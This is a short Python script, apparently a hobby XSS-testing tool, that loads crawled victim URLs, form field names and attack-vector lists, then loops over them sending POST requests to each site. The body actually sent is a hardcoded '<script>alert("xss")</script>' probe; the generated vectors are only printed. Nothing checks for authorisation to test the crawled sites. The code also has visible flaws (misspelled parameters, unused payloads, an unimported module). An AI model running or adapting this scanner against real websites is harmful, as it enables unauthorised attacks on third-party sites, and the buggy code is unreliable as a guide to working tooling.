import urllib.request

class Simluation_Attacker(object):
    def __init__(self):
        #攻击向量列表#
        self.attacker_vector_list = []
        #受害者网页列表#
        self.victim_weblist = []
        #用于表单攻击，上传表单的key#
        self.form_submit_key = []
        self.load_res()
        pass

    def gen_attacker_url(self,victim_url,attacker_vector,form_submit_key,menthod = 'form_post'):
        if menthod == 'form_get':
            return victim_url + '?' + form_submit_key + '=' + attacker_vector
        if menthod == 'form_post':
            body_data = '{\''+form_submit_key+'\':\''+ attacker_vector + '\'}'
            # body_data = urllib.urlencode('{\''+form_submit_key+'\':\''+ attacker_vector + '\'}')
            return victim_url,body_data

    #获取成员变量的各种资源#
    def load_res(self):
        with open('crawler_scrapy/url_list.txt', 'r', encoding='utf-8') as f:
            while 1:
                url = f.readline()
                if not url:
                    break
                self.victim_weblist.append(url.split('\n')[0])
        with open('crawler_scrapy/target_list.txt', 'r', encoding='utf-8') as f:
            while 1:
                injured_key = f.readline()
                if not injured_key:
                    break
                self.form_submit_key.append(injured_key.split('\n')[0])
        with open('gen_attacker_vector/attackerlist.txt', 'r', encoding='utf-8') as f:
            while 1:
                vector = f.readline()
                if not vector:
                    break
                self.attacker_vector_list.append(vector.split('\n')[0])
        pass

    def form_attacker(self,menthod = 'form_post'):
        try:
            for victim_url in self.victim_weblist:
                for key in self.form_submit_key:
                    for vector in self.attacker_vector_list:
                        url, data = self.gen_attacker_url(victim_url, vector, key)
                        print (data)
                        # data_urlencode = urllib.parse.urlencode(data).encode(encoding='UTF8')
                        data_urlencode = urllib.parse.urlencode({'test':'<script>alert("xss")</script> '}).encode(encoding='UTF8')
                        req = urllib.request.Request(url, data=data_urlencode)
                        reponse = urllib.request.urlopen(req).read()
        except Exception as e:
            print(e)
        pass

if __name__ == '__main__':
    attacker = Simluation_Attacker()
    attacker.form_attacker()